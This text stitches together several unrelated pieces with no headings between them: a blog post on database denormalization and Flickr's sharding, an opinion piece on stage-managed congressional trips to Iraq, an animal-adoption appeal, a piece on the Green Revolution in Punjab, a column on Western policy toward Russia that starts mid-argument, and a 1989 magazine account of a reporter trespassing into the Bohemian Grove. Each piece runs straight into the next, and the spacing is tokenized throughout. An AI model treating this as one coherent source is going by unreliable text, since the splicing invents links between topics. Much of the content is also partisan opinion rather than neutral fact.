As Joe Gregorio mentions in his blog post about the emergence of megadata , a lot of the large Web companies such as Google , eBay and Amazon are heavily into denormalizing their databases as well as eschewing transactions when updating these databases to improve their scalability .
Maybe normalization is for sissies …
UPDATE : Someone pointed out in the comments that denormalizing the affiliations table into user 's table would mean the member_count would have to updated in thousands of user 's rows when a new member was added to the group .
This is obviously not the intent of denormalization for performance reasons since it replaces a bad problem with a worse one .
Since an affiliation is a distinct concept from a user , it makes sense for it to have it 's own table .
Replicating the names of the groups a user is affiliated with in the user table is a good performance optimization although it does mean that the name has to be fixed up in thousands of tables if it ever changes .
Since this is likely to happen very rarely , this is probably acceptable especially if we schedule renames to be done by a cron job during offpeak ours
On the other hand , replicating the member count is just asking for trouble .
UPDATE 2 : Lots of great comments here and on reddit indicate that I should have put more context around this post .
Database denormalization is the kind of performance optimization that should be carried out as a last resort after trying things like creating database indexes , using SQL views and implementing application specific in - memory caching .
However if you hit massive scale and are dealing with millions of queries a day across hundreds of millions to billions of records or have decided to go with database partitioning / sharding then you will likely end up resorting to denormalization .
A real - world example of this is the Flickr database back - end whose details are described in Tim O'Reilly 's Database War Stories # 3 : Flickr which contains the following quotes
tags are an interesting one .
lots of the ' web 2.0 ' feature set does n't fit well with traditional normalised db schema design .
denormalization ( or heavy caching ) is the only way to generate a tag cloud in milliseconds for hundereds of millions of tags .
you can cache stuff that 's slow to generate , but if it 's so expensive to generate that you can't ever regenerate that view without pegging a whole database server then it's not going to work ( or you need dedicated servers to generate those views - some of our data views are calculated offline by dedicated processing clusters which save the results into mysql ) .
federating data also means denormalization is necessary - if we cut up data by user , where do we store data which relates to two users ( such as a comment by one user on another user 's photo ) .
if we want to fetch it in the context of both user 's , then we need to store it in both shards , or scan every shard for one of the views ( which does n't scale ) .
we store alot of data twice , but then theres the issue of it going out of sync .
we can avoid this to some extent with two - step transactions ( open transaction 1 , write commands , open transaction 2 , write commands , commit 1st transaction if all is well , commit 2nd transaction if 1st commited ) but there still a chance for failure when a box goes down during the 1st commit .
we need new tools to check data consistency across multiple shards , move data around shards and so on - a lot of the flickr code infrastructure deals with ensuring data is consistent and well balanced and finding and repairing it when it 's not . "
The part highlighted in red is also important to consider .
Denormalization means that you you are now likely to deal with data inconsistencies because you are storing redundant copies of data and may not be able to update all copies of a column value simultaneously when it is changed for a variety of reasons .
Having tools in your infrastructure to support fixing up data of this sort then become very important .

How VIPs Get ' Brainwashed ' on Iraq
When members of Congress – or pundits and journalists , for that matter – are taken on tightly controlled visits to a war zone like Iraq , they undergo what the late Michigan Gov. George Romney famously referred to as “ brainwashing . ”
Bookmark
Digg Email
Printer friendly Romney said he had undergone a propaganda blitz when he visited Vietnam in 1965 , persuading him that military progress was being achieved .
Similarly , recent visitors to Iraq have flown home from August - recess trips with first - hand accounts about signs of success for President George W. Bush ’s troop “ surge . ”
To bolster that case , Bush made his own surprise visit to a U.S. military base in Anbar province on Sept. 3 to tout growing cooperation between Sunni tribal leaders and American forces .
But the sheiks did n't seek out U.S. help because an additional 30,000 U.S. troops had been shipped to Iraq .
Rather , the sheiks had found themselves caught between al - Qaeda extremists on one side and Shiite - dominated government forces on the other .
The Americans became the enemy and erstwhile friend , respectively , of my enemies – and thus an ally of convenience for the Sunni sheiks .
Indeed , the Anbar situation could be viewed as evidence that the political and ethnic divisions of Iraq continue to deepen – with Sunni traditionalists growing only more desperate .
But these shifting sands of allegiances have become the foundation upon which Bush is building his case for open - ended U.S. military involvement in Iraq .
Back in Washington , Bush has played off this “ good news ” in Anbar and in some neighborhoods of Baghdad to establish a new conventional wisdom : the “ surge ” is succeeding and Bush deserves another blank check for the war .
This viewpoint has strengthened as think - tank analysts , pundits and members of Congress have returned from VIP tours of Iraq .
Bush ’s political supporters have especially enjoyed citing perceived cracks in the Democratic anti-war phalanx , noting that even war critics returning from Iraq have admitted that Bush ’s strategy has made progress -- and that Rep. Brian Baird , D - Washington , has defected to Bush ’s side .
“ I have seen firsthand the progress they have made , and I firmly believe we must give them the time and resources they need to succeed , ” Baird said on his return .
But are Baird and the others just the latest politicians and analysts to be “ brainwashed ” while on a tightly managed “ fact - finding ” trip to a war zone ?
Or has meaningful progress actually occurred ?
‘ Potemkin ’ Bazaars Washington
Post correspondent Sudarsan Raghavan investigated the security situation in Iraq and discovered that much of the perceived progress was a case of “ Potemkin ” scenes that looked promising on the outside but lacked either reality or durability when examined in greater detail .
“ Visits to key U.S. bases and neighborhoods in and around Baghdad show that recent improvements are sometimes tenuous , temporary , even illusory , ” Raghavan wrote .
“ In many areas , U.S. forces are now working at cross-purposes with Iraq ’s elected Shiite - led government by financing onetime Sunni insurgents . …
The loyalties of the Iraqi military and police – widely said to be infiltrated by Shiite militias – remain in doubt . ”
Regarding the P.R. use of shopping scenes at Baghdad ’s Dora market as proof of Bush ’s progress , some American soldiers assigned to the project complained about how the showcasing concealed critical shortcomings .
Under pressure from field commander Gen. David Petraeus , U.S. forces got about 300 shops to reopen in time for VIP visits ( compared with more than 850 shops before the U.S. invasion ) .
But some storekeepers had few goods to sell , stayed open only a few hours and took part in the charade because they were paid $ 2,500 .
“ Although they sell dust , they are open for business , ” said 1st Lt. Jose Molina , who was in charge of monitoring and disbursing the grant money .
“ They intend to sell goods or they may just have a handful of goods .
But they are still counted . ”
Another U.S. soldier , Staff Sgt. Josh Campbell , told the Post correspondent , “ personally , I think it ’s a false representation .
But what can I say ?
I ’m just doing my job and do n’t ask questions . ”
[ Washington Post , Sept. 4 , 2007 ]
Though the stage - managed VIP tours might look like obvious deceptions to U.S. troops on the ground , they proved to be extremely effective in coloring the judgments of members of Congress and think - tank analysts .
Even before Congress rushed off for its August recess , it was clear that a propaganda offensive could be expected around these war - zone tours .
On July 15 , during a testy exchange on NBC’s “ Meet the Press , ” Sen . Lindsey Graham , R - South Carolina , cited his multiple visits to Iraq to buttress his case in support of Bush ’s policies .
But Sen. Jim Webb , D - Virginia , a decorated Vietnam veteran , mocked the value of such trips .
“ I ’ve been seven times , ” Graham said in chiding Webb for not undertaking his own visits to Iraq .
“ You have n’t been to Iraq ; you get the dog - and - pony shows , ” responded Webb , recalling how he , as a young officer , had participated in similar briefings of VIPs during the Vietnam War .
Influential Article Despite Webb ’s warning , the VIP trips to Iraq still proved very effective in shaping the Inside - the - Beltway view of the “ surge . ”
After one military - chaperoned visit , Brookings Institution analysts Kenneth Pollack and Michael O’Hanlon framed the debate by getting the New York Times to devote the top of its July 30 op - ed page to their pro-surge story , “ A War We Just Might Win . ”
In that piece , the Times let Pollack and O’Hanlon portray themselves as tough war critics “ who have harshly criticized the Bush administration ’s miserable handling of Iraq . ”
After their visit , however , they concluded that they had no choice but to face the facts and admit undeniable signs of progress .
What the Times left out , however , was that Pollack and O’Hanlon had criticized the Bush administration harshly for not sending more troops to Iraq earlier .
Their op - ed was praising a “ surge ” policy that they long had advocated .
Pollack , a former CIA analyst , also was author of a pre-invasion book entitled The Threatening Storm : The Case for Invading Iraq .
This fact was left out of the Times ’
ID for Pollack in what may have been the first time that an author of a Times op - ed did n’t want the title of his book prominently featured .
[ See Consortiumnews.com ’s “ The NYT ’s New Pro-War Propaganda . ” ]
In the weeks that followed publication of their op - ed , Pollack and O’Hanlon were ubiquitous on TV news shows expounding on their enthusiasm for the “ surge . ”
However , much less attention was given to a response to their op - ed written by seven 82nd Airborne soldiers finishing up 15 - month tours in Iraq .
In their Aug. 19 article , “ The War as We Saw It , ” the soldiers – six sergeants and one Army specialist – called the political debate in Washington “ surreal ” and added : “ To believe that Americans , with an occupation force that long ago outlived its reluctant welcome , can win over a recalcitrant local population and win this counterinsurgency is far - fetched . …
We are skeptical of recent press coverage portraying the conflict as increasingly manageable and feel it has neglected the mounting civil , political and social unrest that we see everyday . ”
Yet , in contrast to the prominent play for Pollack and O’Hanlon , the Times buried the article by the seven servicemen on page 11 of its “ Week in Review ” section .
The article got far less bounce on the chat shows , with even that limited debate often framed as whether the soldiers should be condemned for expressing personal opinions in wartime .
Fools , Anyone ?
Despite that first - hand account by the soldiers – and the five - year history of Bush ’s deceptions about Iraq – the Inside - the - Beltway consensus about the surge ’s success continued to build .
Even Democratic presidential hopefuls , such as Sen. Hillary Clinton , began repositioning toward a less - critical stance on the war .
“ We ’ve begun to change tactics in Iraq , and in some areas , particularly in Anbar province , it ’s working , ” Clinton told the Veterans of Foreign Wars on Aug. 21 , a comment that was trumpeted by Bush ’s supporters .
But is anyone really fooled by the dog - and - pony shows of congressional / media guided tours of Iraq ?
Some longtime Washington observers believe these trips often are taken by politicians and pundits who already have decided to shift toward a pro-war position and simply want to use the “ battlefield visit ” as a pretext for a “ change of heart . ”
Yet , having been on several of these war - zone congressional trips ( as a pool reporter for the Associated Press in the 1980s ) , I can vouch for how effective the propaganda exercises can be .
The late Gov. George Romney ( yes , Mitt Romney ’s father ) was surely not the only politician ( or journalist ) to get “ brainwashed . ”
One of the features making the trips so effective is that the VIPs are not coddled ; there is much less wining - and - dining than people might think .
Usually , the congressional delegation ( or CODEL ) is flown into the war zone on a no - frills C - 130 cargo plane with people sitting in slings hung from the ceiling , much as combat troops would .
Once on the ground , the VIPs are hustled into crisp military briefings from officers in combat fatigues .
Then , there are flights aboard military helicopters to forward positions for the opportunity to chat with carefully selected soldiers , often representing the districts of visiting congressmen .
After the U.S. invasion of Grenada in 1983 , I flew with a CODEL , including Rep. Dick Cheney , R- Wyoming , to a nearby island where a mopping - up operation supposedly was still underway .
Though we saw no actual fighting , we did join the soldiers as they ate their MREs , the barely edible “ meals ready to eat ” that are fed to troops in the field .
These trips achieve a “ bonding ” with the U.S. military much like what was accomplished by “ embedding ” American journalists in combat units during the Iraq invasion in 2003 .
The outsiders begin to see the carefully selected reality through the eyes of their military P.R. chaperones , rather than as truly independent observers .
Political Benefits
The VIPs also get political benefits .
They can return home with photos and anecdotes about how they shared the tough battlefield conditions with real - life soldiers .
And it does n’t hurt to drop a little military jargon into a speech or two .
When I was on a helicopter trip with another CODEL in 1982 during the civil war in El Salvador , the VIPs got a taste of military action when the helicopter pilot reported that he had detected electronic signals from a surface - to - air missile locking on .
The pilot engaged in some evasive maneuvers that tossed the VIPs around and the copter circled back to a more secure landing site .
I was never sure if the threat was real , if the pilot was just showing extra caution because of his payload , or if the exercise was put on for the benefit of the CODEL , whose members could use it to spice up their reports back home .
On Aug. 30 in Iraq , a similar situation occurred aboard a military cargo plane carrying three Republican senators and a Democratic congressman as it took evasive action while departing Baghdad ’s airport .
The VIPs – Sens. Richard Shelby of Alabama , Mel Martinez of Florida and James Inhofe of Oklahoma , and Rep. Robert Cramer of Alabama – said the C - 130 drew fire from three rocket - propelled grenades as it climbed .
“ It was a scary moment , ” Martinez told reporters .
“ Our pilots were terrific .
They banked in one direction and then banked in the other direction , and they set off flares . ”
Martinez added that he quickly put his body armor back on .
“ We were jostled around pretty good , ” said Cramer .
“ There were a few minutes there where I wondered , ‘ Have we been hit ?
Are we O.K. ? ’ ”
Many similar tales of CODEL derring - do will surely liven up the Capitol Hill debate as Congress prepares to grant Bush a new round of spending authority so he can continue the war in Iraq through 2008 .

Adopt a Dog
And tell your friends to adopt dogs instead of buying in pet shops .
Adopting dogs rather than buying from pet shops will save tens of thousands of dogs from being killed in shelters every year .
Approximately 3,000 dogs are killed every day .
Spay or Neuter Your Dog
Spaying / neutering your dog prevents more homeless dogs .
Teach Your Children to Value Animals ' Lives
Most children are born with an innate love for animals .
It can either be fostered , or destroyed .
Sadly for most , it is destroyed by the time children reach school age .
Children learn by example .
Compassionate children are raised by compassionate parents .
When parents model empathy , eat a plant based diet , volunteer for animal related causes , extend mercy and care for animals that have been injured or that need a home , read books with animals as main characters , and support animal - friendly companies , they teach important values for being kind to animals .
Dry soil in India
In the 1970s India had not solved the problem of providing enough food for its vastly growing population .
The Green Revolution promised to change this .
Supported by American foundations the Indian government started a program to modernize the Indian agriculture .
Replacing old traditions with new ( imported ) seeds , fertilizers , herbicides and pesticides .
They achieved to dramatically increase the food production and gained independence from imported food .
But as with every revolution it was hard to oversee the consequences :
The new methods increased the amount of energy used per produced crop .
Important knowledge got lost and was replaced by chemical products .
Which leads to the biggest problem :
The farmers did not know how to handle the chemicals .
A recent study shows :
The report includes details of a survey suggesting that nearly one - third of Punjabi farmers were unaware that pesticides come with instructions for use .
Half of the farmers ignored these instructions .
Three - quarters put empty pesticide containers to domestic uses .
As a result the Green Revolution turned into the Cancer Revolution .
The rate of cancer in Punjabi the region most affected by the Green Revolution is dramatically high .
Even young children are developing uncommon forms of cancer .
The use of agro-chemicals also destroyed the ecosystem .
While a lot of local insects where killed by pesticides multi resistant insects could proliferate .
Due to the high use of fertilizers the quality of Punjabi ’s soil is getting poorer and soil erosion is becoming a wide spread problem .
India ’s population has more than doubled since the 70s .
But the Green Revolution is at its limit .
Providing enough food for its population will again be a big issue for India .
The Indian government tries to fight these problems with banning some chemicals and ironically propagating farming techniques which were declared obsolete during the Green Revolution .
As an interesting side note : The Green Revolution was a strategy to fight support of communism in rural areas .

Meanwhile these leaders neglected the great strategic challenge of the aftermath of cold war : the fate of Russia and its mighty arsenals , its soul tormented by military and political collapse , its pride undimmed .
They danced on Moscow 's grave and hurled abuse at its shortcomings .
They drove its leaders to assert a new energy - based hegemony and find new allies to the south and east .
The result was a new arms race and , after a Kremlin coup , a new war .
Is that the path we are treading ?
When Keynes returned from Versailles in 1919 he wrote an attack on the treaty that ended the first world war .
In The Economic Consequences of the Peace he warned that punishing Germany and demanding crippling reparations would jeopardise Europe 's stability and the building of German democracy .
He confronted politicians , on both sides of the Atlantic , puffed up with the vanity of victory and convinced that the German menace had been laid to rest .
He was right and they were wrong .
For the past six years Washington 's whirling dervishes have reduced Anglo - American foreign policy to a frenzy of bullying hatred of anyone to whom they take a dislike .
One half of this neoconservative agenda is heading for the rocks , American dominance in the Middle East following a stunning victory over a Muslim state .
But the other half is alive and well , pushing ahead with the missile defence system bequeathed by the Reagan administration .
This so - called star wars is militarily unproven and , with the end of the cold war , of no apparent urgency .
But it is astronomically expensive and , as such , has powerful support within America 's industry - led defence community .
When Dick Cheney was finding George Bush a defence secretary in 2000 , Donald Rumsfeld 's chief qualification was his enthusiasm for space - based defence .
Hence America 's 2002 renunciation of the anti-ballistic missile treaty .
Hence the installation of defence systems in Poland and the Czech Republic , in defiance of what was promised to Russia at the end of the cold war .
Hence Rumsfeld 's frequent jibes against old Europe in favour of " new " .
Vladimir Putin's reactive threat this week to retarget his missiles at west Europe was reckless and stupid .
Just when nuclear disarmament is again a live issue and his old enemy , Nato , faces defeat in Afghanistan , he tossed red meat to the Pentagon ( and Whitehall ) hawks .
He strengthened the case for a new British Trident and encouraged an arms race that he knows his own country can ill afford , just as it can ill afford to send Europe frantically seeking alternative energy supplies .
Yet nations do not always act rationally , especially those with authoritarian rulers .
Putin 's belligerence was the predictable outcome of a western diplomacy towards Russia whose ineptitude would amaze even Keynes .
Nato 's dismissal of Moscow 's approach for membership , like the EU 's similar cold shoulder , wholly misunderstood Russian psychology .
The loss of its east European satellites was not just a loss of empire but revived age - old border insecurity .
The pretence that Rumsfeld 's installations , which could be placed anywhere , were aimed at " rogue states such as North Korea " was so ludicrous that only Tony Blair believed it .
There was a moment after 1990 when Russia was weak , immature and unstable , and longed for the embrace of friendship .
Mikhail Gorbachev , Boris Yeltsin , Margaret Thatcher , Bill Clinton , even Blair in his pre-poodle phase , understood this .
Neither side had an interest in reviving the cold war .
Under Bush this has been replaced by an assumption that he should somehow dictate the terms of Russia 's conversion to capitalism and democracy , even as western leaders cringingly paid court to the dictators of Beijing .
This undermined Moscow 's internationalists and played into the hands of Putin 's hard - liners .
It was repeated in Bush 's speech in Germany yesterday .
Putin is throwing down a gauntlet not to the west so much as to his own Kremlin successors .
He is warning them never to trust the west .
To him it remains incorrigibly imperialist , hypocritical in its global morality and unreliable in its treaties .
So he is telling them to cause mischief with oil and gas .
Deny help over Iran and Kosovo .
Stay armed and on guard .
A new study by Ian Kershaw , Fateful Choices : Ten Decisions that Changed the World , examines the options facing world leaders in 1940 - 41 : should Hitler attack Russia ; should Japan expand west or south ; should America enter the war ?
The answers now seem embedded in the concrete of history but at the time they might have gone otherwise .
Like the 1914 shooting of the Archduke in Sarajevo , the events that trigger conflict are easy to see with hindsight .
At the time they might have turned on a penny .
The task of statecraft is to detect the pennies .
Were Nato and Europe wise to snub Russia and thus , de facto , dig a new political ravine across Europe ?
Was America wise to provoke Russia 's generals by moving its military presence close to their borders ?
While defending the west 's commercial interests required a firm line , was it wise to visit on Moscow a stream of criticism of its internal regime ?
Now the west wants to stir Russia 's historic ally , Serbia , into nationalist fury by " granting " independence to Kosovo .
Why should Russia tell Belgrade to acquiesce and demand from Europe some economic quid pro quo ?
Why not sit back and laugh as America and Britain find themselves policing yet another Balkan civil war ?
We may be witnessing only the paranoid exchanges of three world leaders on their way out .
For all its ailments the world is incomparably more stable than it was in 1940 .
But a strategic risk is being taken with Moscow , and therefore by Moscow in return .
Who knows that the Iraq war may seem a footling incompetence alongside the west 's misjudgment of Russia over the past decade ?
Following cold war with cold peace may yet prove a historic error .
And it was gratuitously unnecessary .

Masters of the Universe Go to Camp : Inside the Bohemian Grove by Philip Weiss Spy Magazine , November 1989 , pages 59 - 76
Monte Rio is a depressed Northern California town of 900 where the forest is so thick that some streetlights stay on all day long .
Its only landmark is a kick - ass bar called the Pink Elephant , but a half - mile or so away from " the Pink , " in the middle of a redwood grove , there is , strangely enough , a bank of 16 pay telephones .
In midsummer the phones are often crowded .
On July 21 of this year Henry Kissinger sat at one of them , chuffing loudly to someone -- Sunshine , her called her , and Sweetie -- about the pleasant distractions of his vacation in the forest .
" We had jazz concert , " Kissinger said .
" We had rope trick .
This morning we went bird - watching . "
Proudly Kissinger reeled off the names of some of his fellow campers : " Nick Brady and his brother is here . "
( Brady was the U.S. Treasury Secretary at the time . )
" Tom Johnson is here . "
( Then the publisher of the Los Angeles Times , who had copies of his newspaper shipped up every day . )
" That Indian is here , Bajpai . "
( He meant Shankar Bajpai , former ambassador to the U.S. )
" Today they had a Russian . "
The Russian was the physicist Roald Sagdeev , a member of the Soviet Supreme Council of People 's Deputies , who had given a speech to Kissinger and many other powerful men too .
George Shultz , the former secretary of State , wearing hiking boots , had listened while sitting under a tree .
Kissinger had lolled on the ground , distributing mown grass clippings across his white shirt , being careful not to set his elbow on one of the cigar butts squashed in the grass , and joking with a wiry , nut - brown companion .
The woman on the line now asked about the friend .
" Oh , Rocard is having a ball . "
Kissinger was sharing his turtleneck with Rocard , for nights amid the redwoods grew surprisingly cool .
The two of them were camping in Mandalay , the most exclusive bunk site in the encampment , the one on the hill with the tiny cable car that carries visitors up to the compound .
Meanwhile , Kissinger had been offering Rocard advice : " I told him , ' Do anything you want , hide in the bushes -- just do n't let them see you . ' "
Rocard was Michel Rocard , the prime minister of France , and this was a secret trip .
No one was supposed to know he was peering up at ospreys and turkey vultures and hearing Soviet speakers along with former American secretaries of State and the present secretary of the Treasury .
And David Rockefeller too .
And Dwayne Andreas , the chairman of Archer - Daniels - Midland .
Merv Griffin . Walter Cronkite .
No one was supposed to know that Rocard himself would be speaking the next day down at the lake , under the green speakers ' parasol .
As orange dragonflies coupled dazzlingly over the water , as bullfrogs sounded , Rocard would lean forward and say , " Because you are such an astonishing group of men , I can speak privately . "
It was a devilishly charming thing to say , calculated to flatter the men of the Bohemian Grove .
Every summer for more than a century , the all - male Bohemian Club of San Francisco has led a retreat into a redwood forest 70 miles north of the city , four and a quarter square miles of rugged , majestic terrain that members consider sacred .
The religion they consecrate is right - wing , laissez - faire and quintessentially western , with some Druid tree worship thrown in for fun .
The often bizarre rites have elevated what was once a provincial club for San Franciscans embarrassed by the rude manners of the Wild West into the most exclusive club in the United States , with 2,300 members drawn from the whole of the American establishment and a waiting list 33 years long .
In the first 50 years of the club 's existence the Bohemian Grove was comparatively accessible to outsiders , but in the 1930s , as the club gained influence and its redwoods provided a haven for Republican presidents , it grew quite secretive about its rituals and membership -- you wo n't even find the Grove on public maps .
[ This is not entirely accurate ; " Bohemian Grove " is labeled as such on USGS topographic maps .
-- GWD .]
This has been especially true in the last ten years as Bohemia 's stunning roster has waxed ever more statusy , as Kissinger and Rockefeller and Nick Brady have joined , drawing the attention of left - wing protesters , scholars of elites , and reporters .
Th encampment has become the primary watering hole for Republican administration officials , defense contractors , press barons , old - line Hollywood figures , establishment intellectuals and a handful of German speaking men in lederhosen .
What the Bois de Boulogne was to the ancien regime , the Grove is to America 's power class .
Ronald Reagan and George Bush are members .
So are Gerald Ford and Richard Nixon -- though club directors are said to be miffed at Nixon , a longtime Bohemian Grover , who 's still listed as sleeping in Cave Man , one of the Grove 's 119 curiously and sometimes appropriately named camps .
Today the Grove is stocked with Reaganites .
Former Defense secretary Caspar W. Weinberger , former attorney general William French Smith and former Transportation secretary Drew Lewis are all members .
At the encampment last July , Al Haig was there , along with three other former secretaries of State : Kissinger , Shultz and William P. Rogers ( Rogers as a guest of former national security adviser William P. Clark's ) .
James A. Baker III , the current secretary of State , is also a member , but he could n't make it this year .
The right - wing Hoover Institution at Stanford attended in full force and brought along the president of Washington 's Heritage Foundation .
William F. Buckley Jr. and Malcolm Forbes held court .
Big business shows up : Thomas Watson Jr. of IBM , billionaire John Kluge of Metromedia .
Former Bank of America chairman Samuel Armacost brought IBM chairman John F. Akers , Bechtel chairman S. D. Bechtel Jr. brought Amoco chairman Richard Morrow .
Noted and hoary writers and personalities are members : Herman Wouk , Art Linkletter , Fred Travalena .
Scenting power , press lords skip in from all over the country : Joe Albritton , former owner of The Washington Star ; Charles E. Scripps and Otto Silha of Cowles Media ; the McClatchys of the McClatchy chain ; and David Gergen of U.S. News & World Report all obey the Bohemian command of keeping the goings - on from their readers .
Every spring for many years now , Bohemian Club presidents have formally summoned such men to the Grove with great effusion :
" Brother Bohemians : The Sun is Once Again in the Clutches of the Lion , and the encircling season bids us to the forest -- there to celebrate ... the awful mysteries ! "
" Bohemians come !
Find home again in the Grove !
Burn CARE and hurl his ashes , whirling , from our glade ! "
" Come out Bohemians !
come out and play , come with all the buoyant impetuous rush of youth ! "
And this year , when president George Elliott wrote , more drably , " Around campfires large and small , warm hospitality awaits you .
Of course you must be with us , " I heard his summons , too .
It was a good time to visit the Grove .
The country was still steeped in the aw - shucks authoritarianism of the Reagan years , and if there is any place to study the culture of our ruling class it is here among the Grove 's benevolent , string - tie aristocracy .
Also , it seemed possible that Ronald Reagan himself might make a triumphant return to his longtime camp , Owl 's Nest .
While president he had avoided the Grove , a custom Nixon cemented in 1971 when he canceled a speech planned for the lakeside in the secret encampment after the press insisted on covering it .
For me , the trick was getting in .
A guest card was out of the question : club bylaws have stated that a member - sponsor 's application " shall be in writing and shall contain full information for the guidance of the Board in determining the merits and qualifications of the proposed guest . "
No , Section 8 , Article XVIII was too fine a screen for me .
And my attempts to get a job as a waiter or a valet in one of the camps failed .
In the end I entered by stealth .
Some observers of the Grove had warned that security was too good ; they 'd sniff me out quickly .
I might last three hours before they put me in the Santa Rosa jail for trespassing .
Lowell Bergman , a producer with 60 Minutes who used to hunt rabbits in the nearby hills , remembered a fire road leading into the site near the Guerneville waste - treatment plant but said they 'd spot me sneaking in .
Others mentioned barbed wire and electronic monitoring devices at places where the Grove abuts Monte Rio , and helicopters patrolling the " ridge roads " that traverse the 1,000 - foot hills and form the Grove 's perimeter .
One day I drove up to the front gate and got a daunting glimpse of what looked like the Grove sheriff , a barrel like figure in a Smokey the Bear hat .
A set of checkpoints like the Berlin Wall seemed to stretch out behind him .
But by then I 'd made my connection , My driver was Mary Moore , an Earth Mother type with long silvery - blond hair who is the most active member of a distinctly Californian left - wing group called the Bohemian Grove Action Network .
Moore agreed to help me get in , providing me with a sort of underground railroad .
She put at my service a mountain guide who demanded only that I keep the methods he devised for me confidential .
He had a keen geographical sense and a girlfriend who described a plan to seed magic crystals at the Grove gates to make them open of their own accord so that Native American drummers could walk in .
We did n't do it that way , but it turned out that Grove security is n't quite what it 's reputed to be .
The sociologists who had studied the place were right ; there was no real security .
Reporters seeking to write about the Grove had rarely been inside , and then usually for only a few hours at a time , but I was determined to have a good , long look , so I took care to blend .
I outfitted myself in conservative recreational wear -- a pressed plaid shirt , PermaPrest chinos , Top Siders , a sport jacket -- I always carried a drink , and I made it a point to have that morning 's Wall Street Journal or New York Times under my arm when I surfaced ( though television is against the rules , newspapers are sold at the Grove Civic Center ) .
Thus equipped , I came and went on 7 days during the 16 - day encampment , openly trespassing in what is regarded as an impermeable enclave and which the press routinely refers to as a heavily guarded area .
Though I regularly violated Grove rule 20 ( " Members and guests shall sign the register when arriving at or departing from the Grove " ) , I was never stopped or questioned .
( Another rule forbade cameras outside one 's own camp .
I waited till my last day to bring one in . )
Indeed , I was able to enjoy most pleasures of the Grove , notably the speeches , songs , elaborate drag shows , endless toasts , pre-breakfast gin fizzes , round - the - clock " Nembutals " and other drinks -- though I did n't sleep in any of the camps or swim naked with likeminded Bohemians in the Russian River at night .
My imposture included misrepresenting myself in conversation with other campers , and my story kept changing as I learned more about how life inside was organized .
I said I was a guest of Bromley camp , where unsortable visitors end up .
At 33 , 1 was one of the youngest Bohemians , but I was welcome almost as a policy matter .
" We looked around and saw we were becoming an old - men 's club , " a member said , explaining recent efforts to recruit fresh blood .
Being from New York was fine ; the Grove limits retreat guests to out - of - staters ( though clamoring by well - connected Californians to visit the forest has resulted in the rise of the June " Spring Jinks " weekend ) .
I used my real name .
No one inside acted suspicious , but paranoia about the Grove seemed justified , and I brought along my own version of cyanide : Interol , a tranquilizer used by actors to counteract stage fright .
One day a member asked if I was related to a Bohemian named Jack Weiss .
" No , but I 've heard a lot about him and I 'd like to meet him . "
" You can 't , " he said .
" He 's dead . "
After that I began working a dead West Coast relative 's promise to have me out to the Grove one summer into a shaggy - dog story about my invitation .
In this way I managed to drop in on the principal events of the encampment , right up to the final Saturday , July 29 , 12:30 p.m. , when I attended a Lakeside Talk whose giver was , intriguingly , the only one not identified in the program of events .
" Speaker : To Be Announced , " it said , raising the question of what dignitary might be thought more important than Prime Minister Rocard , who was listed as the speaker on the middle Saturday .
My first full - strength dose of Bohemian culture took place two weeks earlier , the first Saturday night , when after a long day in the Grove I took a seat on the grassy lakeside among 1,500 ocher men for the encampment 's famously surreal opening ritual .
As the magic hour of 9:15 approached , a helicopter from a network newsmagazine circled frantically far above the darkened forest , searching out a spectacle lit at that point only by the hundreds of cigars whose smokers had ignited them in defiance of the California Forest Service 's posted warnings .
My neighbor suggested that someone ought to " shoot the fucker down , " flashing the press hatred that prevails in Bohemia .
" My friends do n't understand this , " a pudgy 35 - year - old in front of me confided to his companion .
" I know that if they could see it , they would see how terrific it is .
It 's like great sex ... "
It was the sort of analogy I was to hear often in the nearly 60 hours I spent inside the Grove .
The friend and I leaned closer .
" It 's more than it 's cracked up to be .
You can't describe it , " he explained .
Then everyone hushed as a column of hooded figures carrying torches emerged solemnly from the woods 100 yards away , bearing a corpse down to the water .
* * *
You know you are inside the Bohemian Grove when you come down a trail in the woods and hear piano music from amid a group of tents and then round a bend to see a man with a beer in one hand and his penis in the other , urinating into the bushes .
This is the most gloried - in ritual of the encampment , the freedom of powerful men to pee wherever they like , a right the club has invoked when trying to fight government anti-sex discrimination efforts and one curtailed only when it comes to a few popular redwoods just outside the Dining Circle .
Tacked to one of these haplessly postprandial trees is a sign conveying the fairy - dust mixture of boyishness and courtliness that envelops the encampment : Gentlemen please !
No pee pee here !
Everything in the encampment is sheltered by redwoods , which admit hazy shafts of sunlight , and every camp has a more or less constant campfire sending a soft column of smoke into the trees .
The walled camps are generally about 100 feet wide and stretch back up the hillside , with wooden platforms on which members set up tents .
Bohemians sleep on cots in these tents , or , in the richer camps , in redwood cabins .
The camps are decorated with wooden or stone sculptures of owls , the Grove symbol .
Members wash up in dormitory - style bathrooms and eat breakfast and dinner collectively in the Dining Circle , a splendid outdoor arena with fresh wood chips covering the ground and only the sky above .
It never rains when the encampment is on .
During the day , idleness is encouraged .
There are few rules , the most famous one being " Weaving Spiders Come Not Here " -- in other words , do n't do business in the Grove .
The rule is widely ignored .
Another , unwritten rule is that everyone drink -- and that everyone drink all the time .
This rule is strictly adhered to .
" His method was to seize a large horse bucket , throw a hunk of ice into it , pour in several bottles of gin and a half a bottle of vermouth , and slosh it all around , " goes one Grove recipe .
The traditional 7:00 a.m. gin fizzes served in bed by camp valets set the pace .
Throughout the skeet - shooting , the domino - playing and the museum talks , right up through the " afterglows " that follow each evening 's entertainment , everyone is perpetually numbed and loose , but a clubbish decorum prevails just the same .
No one throws up .
Now and then , though , a Bohemian sits down in the ferns and passes out .
The sense that you are inside an actual club is heightened by all the furnishings that could not survive a wet season outdoors : the stuffed lion on top of Jungle camp ; the red lanterns in the trees behind Dragons camp at night , which add to the haunting atmosphere ; the paintings of camels , pelicans and naked women that are hung outside ; the soft couch in the doorway of Woof camp , and everywhere pianos that , when the encampment is over , go back to the piano warehouse near the front gate .
There 's a feeling of both great privilege and rusticity .
Bohemians talk about roughing it , but at a privy in the woods near the river , there is a constantly renewed supply of paper toilet - seat covers .
And the sand at the Russian River beach is traversed by coconut - fiber mats and rich figured squares cut from the carpets in the " City Club , " the five - story brick Bohemian building in downtown San Francisco .
All day long there is music in the Grove , and at night in some camps there are programs of entertainment : comics , singers , actors .
Any Bohemian is welcome at such events .
One afternoon , for instance , the Valhalla camp deck was crowded with men drinking Valhalla 's home - brewed beer and listening to singers .
They sang from a small stage in front of a redwood on which was hung a framed nineteenth - century engraving .
The scene was permeated by a kind of kitsch Black Forest imagery , and the setting seemed very Wagnerian -- though the music was sometimes undercut by the soft drumming of tinkling urine off the edge of the porch , where the beer drinkers went one after the other .
The deck 's railing posed a dilemma .
It was set at crotch level , so you had to sort of crouch .
